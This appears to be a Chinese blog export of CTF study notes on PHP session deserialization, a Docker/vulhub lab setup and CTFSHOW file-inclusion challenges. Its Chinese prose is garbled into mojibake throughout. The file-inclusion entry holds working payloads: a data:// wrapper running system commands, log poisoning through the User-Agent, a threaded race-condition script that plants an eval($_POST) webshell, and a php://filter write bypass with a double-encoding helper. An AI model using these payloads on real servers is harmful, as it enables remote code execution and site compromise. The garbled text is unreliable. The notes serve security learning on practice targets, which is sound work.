<h2 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h2><p>å½“ä¸¤ä¸ªæ–‡ä»¶æ‰€ç”¨çš„å¤„ç†å™¨ä¸ç›¸åŒæ—¶ï¼Œä¸”SESSIONæ•°ç»„å†…çš„å€¼å¯æ§æ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ„é€ æ¶æ„æ•°æ®æ¥è¿›è¡Œæ“ä½œ</p>
<h3 id="æ¼”ç¤º"><a href="#æ¼”ç¤º" class="headerlink" title="æ¼”ç¤º"></a>æ¼”ç¤º</h3><p>æˆ‘åœ¨æ³¨å†Œè¿™è¾¹ä½¿ç”¨çš„æ˜¯php_binaryå¤„ç†å™¨ï¼Œç™»å½•é‚£è¾¹ç”¨çš„æ˜¯phpå¤„ç†å™¨</p>
<p>æ³¨å†Œè¿™è¾¹å®ƒçš„ç”¨æˆ·åï¼Œå’Œå¯†ç éƒ½æ˜¯å¯æ§çš„ï¼Œå¦‚æœæˆ‘ä»¬æ­£å¸¸è¾“å…¥ï¼Œå®ƒä¼šè¿™æ ·å­˜å…¥</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240226161914641.png"  alt="image-20240226161914641"></p>
<p>æˆ‘ä»¬å°±å¯ä»¥åœ¨usernameçš„å±æ€§åŠ¨ä¸€äº›æ‰‹è„šè¾¾åˆ°æ”¹å±æ€§çš„ç›®çš„ï¼Œè¿™é‡ŒæŠŠEwojiæ”¹ä¸ºäº†Emoji</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240226164258514.png"  alt="image-20240226164258514"></p>
<p>ä¹‹åå†æ‰“å¼€ç™»å½•æ–‡ä»¶</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240226162151930.png"  alt="image-20240226162151930"></p>
<p>ä¿®æ”¹æˆåŠŸ</p>
<h2 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h2><p>è¿™é‡Œæ˜¯ç”±|äº§ç”Ÿäº†æ­§ä¹‰ï¼Œphpå¤„ç†å™¨æŠŠ|åé¢çš„ä¸œè¥¿å½“ä½œå¯¹è±¡ååºåˆ—åŒ–äº†</p>
<h1 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h1><h2 id="CTFSHOW-web-263"><a href="#CTFSHOW-web-263" class="headerlink" title="CTFSHOW web-263"></a>CTFSHOW web-263</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240226164651595.png"  alt="image-20240226164651595"></p>
<p>é¢˜é¢ï¼Œçœ‹æºç ï¼ŒæŠ“åŒ…æ— æœï¼Œç›´æ¥å¼€æ‰«</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240226164731869.png"  alt="image-20240226164731869"></p>
<p><a class="link"   href="http://www.zip,ä¸‹è½½,æ‰“å¼€/" >www.zip,ä¸‹è½½ï¼Œæ‰“å¼€<i class="fas fa-external-link-alt"></i></a></p>
<p>å‘ç°æ¼æ´ç‚¹</p>
<p>1.å†™å…¥SESSION:åŸæœ¬ç”¨æ¥è®°å½•limitçš„å€¼å¯ä»¥ä¿®æ”¹</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240226185421699.png"  alt="image-20240226185421699"></p>
<p>2.å†™å…¥æ–‡ä»¶:<code>file_put_contents()</code>,è¿™é‡Œçš„æ„æ€æ˜¯ç”¨ç”¨æˆ·è¾“å…¥çš„usernameä¸ºä¸€ä¸ªlog-xxxçš„æ—¥å¿—æ–‡ä»¶å‘½åï¼Œå†™å…¥çš„å†…å®¹passwordå¯ä»¥ç”¨ååºåˆ—ä¿®æ”¹ï¼Œè¿™å°±å¯ä»¥ç›´æ¥å†™é©¬</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240226185527715.png"  alt="image-20240226185527715"></p>
<p>3.è§¦å‘ååºåˆ—åŒ–ï¼Œè¿™é‡Œçš„&#x2F;inc&#x2F;inc.phpæ˜¯ä¸å¯è®¿é—®çš„ï¼Œä½†æ˜¯check.phpæ²¡æœ‰ç¦æ­¢è®¿é—®è€Œä¸”å®ƒåŒ…å«äº†inc.phpï¼Œè®¿é—®check.phpå³å¯è§¦å‘ååºåˆ—åŒ–</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240226185757295.png"  alt="image-20240226185757295"></p>
<p>æœ€åçš„payloadå¦‚ä¸‹ :</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240226185841358.png"  alt="image-20240226185841358"></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240226185855523.png"  alt="image-20240226185855523"></p>
<p>ç„¶åè¿æ¥è¯»å–flagå³å¯</p>
]]></content>
      <categories>
        <category>å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>å…¥é—¨</tag>
        <tag>å­¦ä¹ </tag>
        <tag>phpååºåˆ—åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title>ä½¿ç”¨kali-linuxå’Œdockeræ­å»ºæ¼æ´å¤ç°å¹³å°æ—¥è®°</title>
    <url>/2024/03/11/%E4%BD%BF%E7%94%A8kali-linux%E5%92%8Cdocker%E6%90%AD%E5%BB%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%B9%B3%E5%8F%B0%E6%97%A5%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="å…¶å®æ—©å°±æƒ³å¼„è¿™ä¸ªäº†ï¼Œè€æ˜¯å¿˜äº†ï¼Œè¿™æ¬¡é˜Ÿé•¿å¸ƒç½®äº†ä»»åŠ¡å°±åšäº†å§"><a href="#å…¶å®æ—©å°±æƒ³å¼„è¿™ä¸ªäº†ï¼Œè€æ˜¯å¿˜äº†ï¼Œè¿™æ¬¡é˜Ÿé•¿å¸ƒç½®äº†ä»»åŠ¡å°±åšäº†å§" class="headerlink" title="å…¶å®æ—©å°±æƒ³å¼„è¿™ä¸ªäº†ï¼Œè€æ˜¯å¿˜äº†ï¼Œè¿™æ¬¡é˜Ÿé•¿å¸ƒç½®äº†ä»»åŠ¡å°±åšäº†å§"></a>å…¶å®æ—©å°±æƒ³å¼„è¿™ä¸ªäº†ï¼Œè€æ˜¯å¿˜äº†ï¼Œè¿™æ¬¡é˜Ÿé•¿å¸ƒç½®äº†ä»»åŠ¡å°±åšäº†å§</h3><span id="more"></span>

<h1 id="kali-linuxä¼˜åŒ–"><a href="#kali-linuxä¼˜åŒ–" class="headerlink" title="kali-linuxä¼˜åŒ–"></a>kali-linuxä¼˜åŒ–</h1><p>åˆšåˆšå¼€å§‹ä¸‹çš„æ—¶å€™å¯å¡äº†ï¼Œè¾“å…¥è€æ˜¯æœ‰å»¶è¿Ÿï¼Œç”¨çš„å¾ˆä¸çˆ½</p>
<h2 id="æ‰å¸§é—®é¢˜"><a href="#æ‰å¸§é—®é¢˜" class="headerlink" title="æ‰å¸§é—®é¢˜"></a>æ‰å¸§é—®é¢˜</h2><p><a class="link"   href="https://zhuanlan.zhihu.com/p/265868395" >è§£å†³VMwareè¿è¡Œå¡é¡¿çš„é—®é¢˜ - çŸ¥ä¹ (zhihu.com)<i class="fas fa-external-link-alt"></i></a></p>
<p>äº²æµ‹æœ‰æ•ˆ</p>
<h2 id="num-locké—®é¢˜"><a href="#num-locké—®é¢˜" class="headerlink" title="num locké—®é¢˜"></a>num locké—®é¢˜</h2><p>é¼ æ ‡åœ¨è™šæ‹Ÿæœºå’Œä¸»æœºåˆ‡æ¢çš„æ—¶å€™è€æ˜¯è·³</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240311225635342.png"  alt="image-20240311225635342"></p>
<p>å…¶å®æ˜¯å› ä¸ºä¸»æœºå’Œè™šæ‹Ÿæœºçš„lockçŠ¶æ€ä¸åŒï¼Œæ‘æ•°å­—ä¸Šé¢çš„é‚£ä¸ªnumè·³æˆä¸€è‡´å³å¯</p>
<h1 id="ä¸‹è½½dockerå’Œvulhub"><a href="#ä¸‹è½½dockerå’Œvulhub" class="headerlink" title="ä¸‹è½½dockerå’Œvulhub"></a>ä¸‹è½½dockerå’Œvulhub</h1><p>sudo apt-get install docker.io</p>
<p>sudo apt-get install python3-pip</p>
<p>sudo apt-get install docker-compose</p>
<p>git clone <a class="link"   href="https://github.com/vulhub/vulhub.git" >https://github.com/vulhub/vulhub.git<i class="fas fa-external-link-alt"></i></a></p>
<p>è¿™é‡Œå‡ºç°äº†å¥½å¤šæŠ¥é”™ï¼Œè€å¿ƒæ’æŸ¥ï¼Œæ”¶é›†èµ„æ–™</p>
<h1 id="dockerä¸€äº›å°çŸ¥è¯†"><a href="#dockerä¸€äº›å°çŸ¥è¯†" class="headerlink" title="dockerä¸€äº›å°çŸ¥è¯†"></a>dockerä¸€äº›å°çŸ¥è¯†</h1><p>è¿™é‡Œæœ‰å‡ ä¸ªæ¦‚å¿µï¼Œä»“åº“ï¼ŒtaråŒ…ï¼Œdockerfileï¼Œå®¹å™¨</p>
<p>æˆ‘ä»¬è¦è®°ä½è¿™å››ä¸ªä¸œè¥¿éƒ½æ˜¯ä¸ºä¸€ä¸ªä¸œè¥¿â€”â€”é•œåƒæœåŠ¡çš„å³å¯</p>
<p>é•œåƒæ˜¯ä»€ä¹ˆï¼Œé•œåƒå°±æ˜¯ä¸€ä¸ªå·¨å¤§çš„å‹ç¼©æ–‡ä»¶ï¼Œå®ƒå¯ä»¥æŠŠå¾ˆå¤šä¸œè¥¿å‹ç¼©åœ¨é‡Œé¢ï¼Œæ¯”å¦‚ä¸€äº›ç³»ç»Ÿç¯å¢ƒå•¥çš„</p>
<h2 id="ä»“åº“"><a href="#ä»“åº“" class="headerlink" title="ä»“åº“"></a>ä»“åº“</h2><p>ç”¨æ¥å­˜å‚¨é•œåƒçš„åœ°æ–¹</p>
<p><code>docker pull</code>å°†é•œåƒä»ä»“åº“æ‹‰å‡ºæ¥</p>
<p><code>docker push</code>å°†é•œåƒæ¨è¿›ä»“åº“</p>
<h2 id="taråŒ…"><a href="#taråŒ…" class="headerlink" title="taråŒ…"></a>taråŒ…</h2><p>taræ˜¯é•œåƒçš„å‹ç¼©ï¼Œé€šè¿‡æŒ‡ä»¤å¯ä»¥è§£å‹å’Œæ‰“åŒ…</p>
<p><code>docker save</code>æŠŠé•œåƒæ‰“æˆtaråŒ…</p>
<p><code>docker load</code>æŠŠtaråŒ…è§£è¯ä¸ºé•œåƒ</p>
<h2 id="dockerfile"><a href="#dockerfile" class="headerlink" title="dockerfile"></a>dockerfile</h2><p>ç”±äºdockerfileçš„è¯­æ³•æˆ‘ä¸æ˜¯å¾ˆæ‡‚</p>
<p>è¿™é‡ŒåªçŸ¥é“dockerfileå¯ä»¥åœ¨ç¼–è¾‘åé€šè¿‡<code>docker build</code>å»ºæˆä¸€ä¸ªé•œåƒæ–‡ä»¶</p>
<h2 id="å®¹å™¨"><a href="#å®¹å™¨" class="headerlink" title="å®¹å™¨"></a>å®¹å™¨</h2><p>å®¹å™¨å°±æ˜¯å®¹çº³é•œåƒè§£å‹å‡ºæ¥åçš„æ‰€æœ‰ä¸œè¥¿ï¼Œå®ƒå®¹ä¸‹äº†æ‰€æœ‰çš„é…ç½®ï¼Œä»£ç å•¥çš„</p>
<p>æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥è®¿é—®è¿™ä¸ªå®¹å™¨å¾—åˆ°æ‰€å¾—çš„æœåŠ¡</p>
<p><code>docker run -dit -p 100:80 --name ewoji</code>å¯åŠ¨å®¹å™¨â€“å‚æ•°-dè¡¨ç¤ºåœ¨åå°è¿è¡Œï¼Œ-pè¡¨ç¤ºç«¯å£æ˜ å°„å¦‚100:80ï¼ˆå‰æ˜¯å†…ç½‘åæ˜¯å¤–ç½‘ï¼‰â€“name ç»™ä½ çš„å®¹å™¨å–å -tå¼€ä¸ªå¯äº’åŠ¨çš„bash -iæ ‡å‡†è¾“å‡ºå›æœ¬æœº</p>
<p><code>docker commit</code>å®¹å™¨åœ¨æ”¹åŠ¨åè¿˜å¯ä»¥å†å‹ç¼©å›é•œåƒ</p>
<p><code>docker exec -it yourname bash </code>è¿›å…¥å®¹å™¨çš„ç»ˆç«¯è¿›è¡Œæ§åˆ¶ exité€€å‡º </p>
<p><code>docker ps</code>æŸ¥çœ‹å·²ç»å¼€å¯çš„å®¹å™¨çš„ä¿¡æ¯</p>
<h2 id="docker-compose"><a href="#docker-compose" class="headerlink" title="docker-compose"></a>docker-compose</h2><p>docker-composeå°±æ˜¯æŒç®¡å¤šä¸ªå®¹å™¨ç›¸äº’é€šä¿¡çš„ä¸œè¥¿</p>
<p>å¤šä¸ªå®¹å™¨é€šè¿‡ä¸€å¼ dockerç½‘å¡æ¥å®ç°ipåœ°å€çš„åˆ†é…ï¼Œå®¹å™¨ä¹‹é—´å¯ä»¥ç›´æ¥curl+ipæ¥è·å–å¦ä¸€å®¹å™¨çš„æ•°æ®ï¼Œæœ¬åœ°åˆ™é€šè¿‡ç½‘å¡è·¯ç”±æ¥ä¸å®¹å™¨äº¤æ¢ä¿¡æ¯ï¼ˆä¸€èˆ¬åœ¨åˆ›å»ºå®¹å™¨çš„æ—¶å€™è¦åˆ†é…å¥½åŸŸåï¼Œä¸ç„¶åˆè¦åˆ°å®¹å™¨ä¸Šçœ‹hostæ–‡ä»¶ï¼‰</p>
<p><code>docker run -dit --link ewoji:ewoji --name eowji</code>æŠŠå¦ä¸€ä¸ªå®¹å™¨ewojiæ˜ å°„åˆ°æœ¬å®¹å™¨ï¼Œå…¶å®å°±æ˜¯ä¿®æ”¹hostæ–‡ä»¶</p>
<p>ä¹‹åå°±ç›´æ¥curl ewojiå°±å¥½äº†</p>
<p>æ—¢ç„¶è¿™æ ·é‚£è¿˜ç”¨docker-composeå¹²å˜›å‘¢ï¼Œè¯•æƒ³å¦‚æœæœ‰ä¸‰ä¸ªå®¹å™¨ï¼Œä¸€ä¸ªnginxï¼Œä¸€ä¸ªphpï¼Œä¸€ä¸ªmysqlï¼Œç”¨æˆ·é€šè¿‡80ç«¯å£ä½¿ç”¨NGINXæœåŠ¡ï¼Œé‚£ä¹ˆNginxå®¹å™¨å¿…ç„¶è¦ç”¨linké“¾æ¥phpï¼Œè€Œphpåˆè¦é“¾æ¥mysqlï¼Œè€Œä¸”åˆ›å»ºå®¹å™¨çš„é¡ºåºè¿˜å¿…é¡»å…ˆä»mysqlå¼€å§‹ï¼Œä¸ç„¶phpå°±æ— æ³•é…ç½®é“¾æ¥</p>
<p>é‚£ä¹ˆæœ‰æ²¡æœ‰ä¸€ç§å¯èƒ½ï¼Œå°±æ˜¯æˆ‘ä»¬æŠŠé…ç½®æ–‡ä»¶ç»Ÿä¸€æŒç®¡ï¼Œå¯ä»¥å®æ—¶ä¿®æ”¹å‘¢ï¼Œé‚£å°±æ˜¯docker-compose</p>
<p>ç­‰äºä¸€ä¸ªç»Ÿä¸€éƒ¨ç½²å§</p>
<h3 id="docker-compose-yml"><a href="#docker-compose-yml" class="headerlink" title="docker-compose.yml"></a>docker-compose.yml</h3><p><img   src="/../img/$%7Bfiilename%7D/image-20240312181044240.png"  alt="image-20240312181044240"></p>
<p>å¯è§è¿™é‡Œåšäº†é…ç½®æ–‡ä»¶å’Œæ ¹ç›®å½•çš„æ˜ å°„</p>
<p><code>docker-compose up -d</code>è¿™æ ·å°±å¼€å§‹æ‹‰å–é•œåƒäº† </p>
<h1 id="ä½¿ç”¨vulhubä¸­çš„é¶åœº"><a href="#ä½¿ç”¨vulhubä¸­çš„é¶åœº" class="headerlink" title="ä½¿ç”¨vulhubä¸­çš„é¶åœº"></a>ä½¿ç”¨vulhubä¸­çš„é¶åœº</h1><p>ls vulhub</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240312174132393.png"  alt="image-20240312174132393"></p>
<p>è¿™é‡Œæœ‰å¾ˆå¤šï¼Œé€‰ä¸ªè®¤è¯†çš„<code>cd vulhub/weblogic/CVE-2018-2894</code>,<code>docker run -d up</code>è¿™é‡Œå®é™…ä¸Šå°±æ˜¯é›†æˆäº†<code>docker run</code>å’Œ<code>docker-compose up -d</code></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240312181853731.png"  alt="image-20240312181853731"></p>
<p>çœ‹åˆ°å·²ç»å¯åŠ¨äº†ï¼Œå†è®¿é—®æœ¬åœ°ipå’Œä½ æ˜ å°„çš„ç«¯å£å³å¯</p>
<p><code>docker stop &lt;id or name&gt;</code>å…³é—­å®¹å™¨</p>
<p><code>docker rm &lt;id or name&gt;</code>åˆ é™¤å®¹å™¨ï¼Œè®°å¾—å…ˆå…³é—­å†åˆ é™¤</p>
<h1 id="ä½¿ç”¨æœ¬åœ°çš„é•œåƒæ–‡ä»¶æ­å»ºé¶åœº"><a href="#ä½¿ç”¨æœ¬åœ°çš„é•œåƒæ–‡ä»¶æ­å»ºé¶åœº" class="headerlink" title="ä½¿ç”¨æœ¬åœ°çš„é•œåƒæ–‡ä»¶æ­å»ºé¶åœº"></a>ä½¿ç”¨æœ¬åœ°çš„é•œåƒæ–‡ä»¶æ­å»ºé¶åœº</h1><p>ä¸‹è½½å¥½çš„äº”é¢˜</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240312195458969.png"  alt="image-20240312195458969"></p>
<p>è¿›å…¥å“ªä¸ªrdéƒ½å¯ä»¥ï¼Œçœ‹è§é‡Œé¢æœ‰Dockerfileæ–‡ä»¶ï¼Œåœ¨è¿™é‡Œæ‰“å¼€ç»ˆç«¯</p>
<p><code>docker build -t name .</code>ç‰¹åˆ«æ³¨æ„åé¢çš„é‚£ä¸ªç‚¹ä»£è¡¨å½“å‰ç›®å½•</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240312195639419.png"  alt="image-20240312195639419"></p>
<p>å¯ä»¥çœ‹è§å·²ç»æ‹‰æˆé•œåƒäº†</p>
<p>æ¥ç€è¿™é‡Œåº”è¯¥æ˜¯æ²¡æœ‰å¼„docker-compose.ymlå§é‚£å°±ä¸¤ä¸ªç›´æ¥runå°±å¥½äº†</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240312205525422.png"  alt="image-20240312205525422"></p>
]]></content>
      <categories>
        <category>æ¼æ´å¤ç°</category>
        <category>å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>æ¼æ´å¤ç°</tag>
        <tag>å·¥å…·</tag>
      </tags>
  </entry>
  <entry>
    <title>æ–‡ä»¶åŒ…å«æ¼æ´</title>
    <url>/2024/03/13/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>å¼€</p>
<span id="more"></span>

<h1 id="web-79"><a href="#web-79" class="headerlink" title="web 79"></a>web 79</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240313101524315.png"  alt="image-20240313101524315"></p>
<p><code>file=data://plain/text,&lt;?= &#39;tac flag.php&#39;?&gt;</code><?echo 1?>ç­‰äº<?= 1?>,éœ€è¦æ‰“å¼€short_open_tag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=</span><br><span class="line">PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs ===&gt; &lt;?php system(&#x27;cat flag.php&#x27;);</span><br></pre></td></tr></table></figure>

<h1 id="web-80"><a href="#web-80" class="headerlink" title="web 80"></a>web 80</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240313111931278.png"  alt="image-20240313111931278"></p>
<p>æ–°å§¿åŠ¿ï¼ŒåŒ…å«ç›®å½•æ–‡ä»¶</p>
<p>ç›®å½•æ–‡ä»¶ä¼šè®°å½•æˆ‘ä»¬çš„uaï¼Œæµè§ˆå™¨çš„ä¸€äº›ä¿¡æ¯ï¼Œé‚£æˆ‘ä»¬åœ¨uaæ’å…¥phpä»£ç ï¼Œå†è®©includeåŒ…å«å¹¶æ‰§è¡Œï¼Œå°±å¯ä»¥getshellï¼Œå…ˆåŒ…å«</p>
<p>Nginx:&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
<p>Apache:&#x2F;var&#x2F;log&#x2F;apache&#x2F;access.log</p>
<p>æˆ–è®¸è¿˜å¯ä»¥è¯•è¯•æœ‰æ²¡æœ‰error.log</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240313111318671.png"  alt="image-20240313111318671"></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240313111708459.png"  alt="image-20240313111708459"></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240313111721356.png"  alt="image-20240313111721356"></p>
<p>å¾—åƒ</p>
<p>å½“ç„¶ä½ ä¹Ÿå¯ä»¥è®©fileåŒ…å«ä½ æœåŠ¡å™¨çš„æœ¨é©¬æ–‡ä»¶ï¼Œç„¶åç›´æ¥ä¸Šçº¿å®ƒçš„æœåŠ¡å™¨ä¹Ÿå¯ä»¥</p>
<h1 id="web-81"><a href="#web-81" class="headerlink" title="web 81"></a>web 81</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240313111952192.png"  alt="image-20240313111952192"></p>
<p>å¤šè¿‡æ»¤äº†ä¸€ä¸ª:</p>
<p>å’Œä¸Šé¢˜ä¸€æ ·ï¼Œä¸èƒ½è¯·æ±‚è‡ªå·±æœåŠ¡å™¨çš„æœ¨é©¬è€Œå·²</p>
<h1 id="web-82-86"><a href="#web-82-86" class="headerlink" title="web 82-86"></a>web 82-86</h1><p><a href="https://blog.csdn.net/qq_46918279/article/details/120106832">CTFSHOW-æ–‡ä»¶åŒ…å«_highlight_file(<strong>file</strong>);-CSDNåšå®¢</a></p>
<p>è¿›è¡Œä¸€ä¸ªæ–°çŸ¥è¯†çš„å­¦</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"> </span><br><span class="line">url=<span class="string">&#x27;http://08d4a04e-19b3-4049-8a81-e9c6226eee2f.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line"><span class="comment">#è®¾ç½®PHPSESSIDçš„å€¼</span></span><br><span class="line">sessionid=<span class="string">&#x27;ctfshow&#x27;</span>     </span><br><span class="line">data=&#123;<span class="string">&quot;1&quot;</span>:<span class="string">&quot;file_put_contents(&#x27;/var/www/html/tao.php&#x27;,&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;);&quot;</span>&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#ä¸ºäº†è¿›è¡Œæ¡ä»¶ç«äº‰ï¼Œéœ€è¦ä¸€è¾¹å†™ä¸€è¾¹è¯»</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#è¿›è¡Œä¸Šä¼ æ–‡ä»¶æ—¶éœ€è¦postä¼ é€’åä¸ºPHP_SESSION_UPLOAD_PROGRESSå€¼ä¸ºä¸€å¥è¯æœ¨é©¬</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">	fileBytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>)          <span class="comment">#ç”Ÿäº§ä¸€ä¸ª50kçš„æ–‡ä»¶</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		response=session.post(url,</span><br><span class="line">			data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>&#125;,</span><br><span class="line">			cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid&#125;,</span><br><span class="line">			files=&#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;ctfshow.jpg&#x27;</span>,fileBytes)&#125;    <span class="comment">#è®¾ç½®æ–‡ä»¶åå­—å’Œå†…å®¹</span></span><br><span class="line">			)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#è¯»å–sessionæ–‡ä»¶ï¼Œè¿™é‡Œæ–‡ä»¶ä¸º/tmp/sess_ctfshow</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		response=session.post(url+<span class="string">&#x27;?file=/tmp/sess_&#x27;</span>+sessionid,data=data)</span><br><span class="line">		response2=session.get(url+<span class="string">&#x27;tao.php&#x27;</span>);</span><br><span class="line">		<span class="keyword">if</span> response2.status_code==<span class="number">200</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;++++++++++++++++++++&#x27;</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(response2.status_code)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> </span><br><span class="line">	<span class="comment">#å¼€å¯å¤šçº¿ç¨‹è¿›è¡Œç«äº‰	</span></span><br><span class="line">	evnet=threading.Event()</span><br><span class="line">	<span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:			</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">			threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">			threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">	evnet.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>



<h1 id="web-87"><a href="#web-87" class="headerlink" title="web 87"></a>web 87</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240316125758740.png"  alt="image-20240316125758740"></p>
<p>è¿™é¢˜ç›®çš„æ˜¯å†™å…¥æœ¨é©¬ï¼Œå¹¶æˆåŠŸæ‰§è¡Œæœ¨é©¬</p>
<p>åˆ†æä¸€æ³¢:</p>
<p>è¿™é‡Œçš„æ–‡ä»¶åä¸­ä¸èƒ½æœ‰phpï¼Œdataï¼Œï¼šï¼Œ.</p>
<p>å¹¶ä¸”æœ¨é©¬å†™ä¸Šå»åè¿˜ä¼šå…ˆæ‰§è¡Œæ­»äº¡ç¨‹åºï¼Œä¸ä¼šæ‰§è¡Œæœ¨é©¬</p>
<p>è¯¥æ€ä¹ˆåš</p>
<p>å…ˆè¦äº†è§£ä¸€ä¸‹<code>php://filter/write=convert.base64-decode/resouce=flag.php</code></p>
<p>è¿™é‡Œæ˜¯æ‰“å¼€ä¸€ä¸ªä¸­é—´æµï¼Œå¦‚æœæˆ‘ä»¬åœ¨æ–‡ä»¶åé‚£é‡Œå†™ä¸Šè¿™ä¸ªçš„è¯ï¼Œé‚£ä¹ˆ<code>file_put_contents()</code>ä¼šè¿™æ ·åšï¼ŒæŠŠç¬¬äºŒä¸ªå‚æ•°çš„å€¼ä»¥base64è§£ç ï¼Œå¹¶ä¸”å†™åˆ°flag.phpæ–‡ä»¶ä¸­ï¼Œæ¥ä¸‹æ¥å°±ä»‹ç»å¦‚ä½•çªç ´é™åˆ¶</p>
<h2 id="æ–‡ä»¶å"><a href="#æ–‡ä»¶å" class="headerlink" title="æ–‡ä»¶å"></a>æ–‡ä»¶å</h2><p>æ—¢ç„¶æˆ‘ä»¬è¦å†™ä¸Šä¸Šé¢çš„payloadï¼Œé‚£ä¹ˆè¯¥å¦‚ä½•ç»•è¿‡ï¼Œå¯ä»¥çœ‹åˆ°ä¸‹é¢è¿˜æœ‰ä¸€å±‚urlè§£ç ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥åŒé‡urlç¼–ç ç»•è¿‡ï¼Œè‡ªå·±ç”¨pythonå†™äº†ä¸ªè„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">payload = <span class="built_in">input</span>(<span class="string">&quot;your payload:[+]&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">twencode</span>(<span class="params">payload</span>):</span><br><span class="line">    res=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    chars = <span class="built_in">list</span>(payload)</span><br><span class="line">    length = <span class="built_in">len</span>(payload)</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">        asc = <span class="built_in">ord</span>(char)</span><br><span class="line">        x0 = <span class="built_in">hex</span>(asc)</span><br><span class="line">        t = x0.replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        res += <span class="string">&#x27;%25&#x27;</span>+t</span><br><span class="line">        <span class="comment">#print(res)</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]&quot;</span>+twencode(payload))</span><br><span class="line"><span class="comment">#check it</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[-]&quot;</span>+(urllib.parse.unquote((urllib.parse.unquote(twencode(payload))))))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img   src="/../img/$%7Bfiilename%7D/image-20240316222716829.png"  alt="image-20240316222716829"></p>
